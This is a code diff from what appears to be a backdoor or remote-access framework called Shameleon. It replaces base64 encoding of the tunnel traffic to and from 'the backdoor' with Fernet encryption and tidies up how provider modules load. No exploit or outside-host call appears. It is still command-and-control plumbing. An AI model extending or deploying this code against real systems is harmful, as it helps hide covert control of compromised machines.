@@ -3,11 +3,11 @@ from __future__ import annotations
 import sys
 import threading
 import time
-from base64 import b64decode
-from base64 import b64encode
 from pkgutil import iter_modules
 from queue import Queue
 from uuid import uuid4
+
+from cryptography.fernet import Fernet
 
 
 class ShameleonProvider(threading.Thread):
@@ -21,9 +21,10 @@ class ShameleonProvider(threading.Thread):
     """
     _PROVIDERS: dict[str, type[ShameleonProvider]] = {}
 
-    def __init__(self):
+    def __init__(self, secret: str):
         super().__init__()
-        self._tunnels = {
+        self._crypto = Fernet(secret)
+        self._tunnels: dict[str, dict[str, Queue]] = {
             'system': {'in': Queue(), 'out': Queue()},
         }
 
@@ -90,8 +91,8 @@ class ShameleonProvider(threading.Thread):
             data (bytes): Data to send to the backdoor
         """
         header = f"{tunnel_id}:"
-        encoded_data = b64encode(data).decode('utf-8')
-        order = header + encoded_data
+        encrypted_data = self._crypto.encrypt(data).decode('utf-8')
+        order = header + encrypted_data
         self._tunnels[tunnel_id]['out'].put(order)
 
     def receive_data(self, tunnel_id: str) -> bytes:
@@ -108,9 +109,9 @@ class ShameleonProvider(threading.Thread):
         """
         data: bytes = b''
         while not self._tunnels[tunnel_id]['in'].empty():
-            encoded = self._tunnels[tunnel_id]['in'].get(block=False)
-            decoded = b64decode(encoded.encode('utf-8'))
-            data += decoded
+            encrypted = self._tunnels[tunnel_id]['in'].get(block=False)
+            decrypted = self._crypto.decrypt(encrypted.encode('utf-8'))
+            data += decrypted
         return data
 
     def not_handled_data(self, tunnel_id: str, data: bytes):
@@ -123,8 +124,8 @@ class ShameleonProvider(threading.Thread):
             tunnel_id (str): Unique identifier of the tunnel
             data (bytes): data to put in the reception queue
         """
-        encoded = b64encode(data)
-        self._tunnels[tunnel_id]['in'].put(encoded)
+        encrypted = self._crypto.encrypt(data)
+        self._tunnels[tunnel_id]['in'].put(encrypted)
 
     # Must be implemented
     def _send_payload(self, data: list[str]):
@@ -139,10 +140,6 @@ class ShameleonProvider(threading.Thread):
     def base_class(self):
         return self.__class__.__bases__[0].__name__
 
-    @property
-    def module_name(self) -> str:
-        return self.__class__.__name__[:-len(self.base_class)]
-
     @classmethod
     def _module_collection(cls):
         return sys.modules[cls.__module__.rsplit('.', 1)[0]]
@@ -152,8 +149,9 @@ class ShameleonProvider(threading.Thread):
         for submodule in iter_modules(cls._module_collection().__path__):
             if submodule.name in ('base',):
                 continue
+            print(submodule)
             module = __import__(
-                f"{cls._module_collection().__name__}.{submodule.module_name.lower()}",
+                f"{cls._module_collection().__name__}.{submodule.name.lower()}",
                 fromlist=[''],
             )
             module_name = getattr(module, 'PROVIDER_NAME')
